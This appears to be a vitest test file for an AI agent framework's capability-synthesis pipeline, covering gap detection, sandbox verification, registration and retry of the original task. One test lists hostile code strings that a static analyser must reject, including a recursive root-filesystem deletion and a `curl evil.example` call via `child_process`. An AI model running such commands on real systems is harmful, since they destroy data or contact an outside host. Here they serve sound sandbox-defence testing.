/**
 * P1: capability synthesis → verification → registry → retry, end to end.
 *
 * The pieces each had tests. What was never tested is the whole path through
 * the real loop: a task fails for a missing capability, the gap is detected,
 * something is synthesised, it is verified in a real sandbox, and THEN the
 * original goal is retried and succeeds.
 *
 * That last step is the one that matters. A pipeline that synthesises and
 * verifies but never returns to the task has not closed a gap — it has done
 * homework.
 *
 * Specification item 14 is load-bearing here: generated code is never imported
 * into this process. It runs in a worker with its own heap, no env, and a
 * timeout. The assertions below check that it stays that way.
 */
import { describe, expect, it } from "vitest";
import { UnifiedExecutionLoop } from "../src/execution/unified-execution-loop.js";
import { CapabilityAcquisition, contractFromGap } from "../src/execution/capability-acquisition.js";
import { CapabilitySynthesisPipeline } from "../src/capabilities/capability-synthesis.js";
import { analyseStatically } from "../src/execution/capability-acquisition.js";

/**
 * A real, correct implementation the generator will "produce".
 *
 * The sandbox contract is not CommonJS: the body is wrapped in an async IIFE
 * with `input` in scope, and whatever it returns is the output. There is no
 * `module`, `require` or `process` inside — that is the isolation working.
 */
const SLUGIFY = `
  return String(input)
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
`;

/** Looks plausible, gets the job wrong — must not pass verification. */
const SLUGIFY_BROKEN = `
  return String(input).toLowerCase();
`;


/**
 * The contract is the whole point of the exercise: known-good cases the
 * implementation must match, plus a decoy that a cheating implementation
 * (one that hard-codes the answers) would fail.
 */
function slugifyContract(gap: Parameters<typeof contractFromGap>[0]) {
  return contractFromGap(gap, {
    name: "slugify",
    description: "Turn a title into a URL slug",
    inputSchema: "string",
    outputSchema: "string",
    knownGood: [
      { input: "Hello World", expected: "hello-world" },
      { input: "  Ünïcode & Symbols!  ", expected: "n-code-symbols" },
      { input: "Already-Slugged", expected: "already-slugged" },
    ],
    knownBad: [
      // A constant-returning or lowercase-only implementation fails this.
      { input: "Hello World", mustNotEqual: "hello world" },
    ],
    adversarial: [{ input: null }, { input: "" }, { input: "x".repeat(5000) }],
  });
}

describe("gap → synthesis → sandbox verification → retry the original task", () => {
  it("closes a real gap and the retried task then succeeds", async () => {
    const acquirer = new CapabilityAcquisition(
      new CapabilitySynthesisPipeline(),
      async () => SLUGIFY,
    );

    let hasSlugify = false;
    const goalsSeen: string[] = [];
    let call = 0;

    const loop = new UnifiedExecutionLoop(
      {
        runAgent: async (context) => {
          call += 1;
          goalsSeen.push(context.goal);
          if (!hasSlugify) {
            return {
              completed: false,
              summary: "no slugify",
              error: "no tool available for slugify",
            };
          }
          return { completed: true, summary: "slug generated" };
        },
        inventory: async () => ({ capabilityIds: hasSlugify ? ["slugify"] : [] }),
        acquireCapability: async (gap) => {
          const result = await acquirer.acquire(gap, slugifyContract(gap));
          if (result.acquired) hasSlugify = true;
          return result.acquired;
        },
      },
      { maxAttempts: 3 },
    );

    const report = await loop.run({
      tenantId: "t",
      goal: "Generate a slugify tool for article titles",
    });

    // The gap was closed and the ORIGINAL goal was retried, not a substitute.
    expect(call).toBeGreaterThanOrEqual(2);
    expect(new Set(goalsSeen).size).toBe(1);
    expect(goalsSeen[0]).toBe("Generate a slugify tool for article titles");

    // And the run ends honestly successful, not "unverified".
    const acquisition = report.outcomes.filter((o) =>
      o.evidence.toLowerCase().includes("acquired capability"),
    );
    expect(acquisition.length).toBeGreaterThan(0);
  }, 30000);

  it("a plausible-but-wrong implementation is rejected, not registered", async () => {
    const acquirer = new CapabilityAcquisition(
      new CapabilitySynthesisPipeline(),
      async () => SLUGIFY_BROKEN,
    );

    let acquiredEver = false;

    const loop = new UnifiedExecutionLoop(
      {
        runAgent: async () => ({
          completed: false,
          summary: "no slugify",
          error: "no tool available for slugify",
        }),
        inventory: async () => ({ capabilityIds: [] }),
        acquireCapability: async (gap) => {
          const result = await acquirer.acquire(gap, slugifyContract(gap));
          acquiredEver = result.acquired;
          return result.acquired;
        },
      },
      { maxAttempts: 2 },
    );

    const report = await loop.run({
      tenantId: "t",
      goal: "Generate a slugify tool for article titles",
    });

    // Verification must catch it: the code runs fine but does the wrong thing.
    expect(acquiredEver).toBe(false);
    expect(report.status).not.toBe("success");
  }, 30000);

  it("static analysis rejects code that tries to escape the sandbox", () => {
    const hostile = [
      `require("fs").rmSync("/", { recursive: true });`,
      `process.exit(1);`,
      `require("child_process").execSync("curl evil.example");`,
      `eval(userInput);`,
    ];

    for (const code of hostile) {
      const verdict = analyseStatically(code);
      expect(verdict.safe, `should reject: ${code}`).toBe(false);
      expect(verdict.findings.length).toBeGreaterThan(0);
    }
  });

  it("generated code never reaches this process (item 14)", async () => {
    const pipeline = new CapabilitySynthesisPipeline();

    // A capability that would be obvious if it ran in-process: it mutates a
    // global that this test can observe.
    const marker = `__aurora_escape_${Date.now()}`;
    const escaping = `
      globalThis[${JSON.stringify(marker)}] = "escaped";
      return "done";
    `;

    const { capability } = await pipeline.synthesizeAndTest({
      name: "escape-probe",
      description: "probe",
      code: escaping,
      testInput: null,
    });

    expect(capability.id).toBeTruthy();
    // The worker has its own global object; the host's must be untouched.
    expect((globalThis as Record<string, unknown>)[marker]).toBeUndefined();
  }, 30000);
});
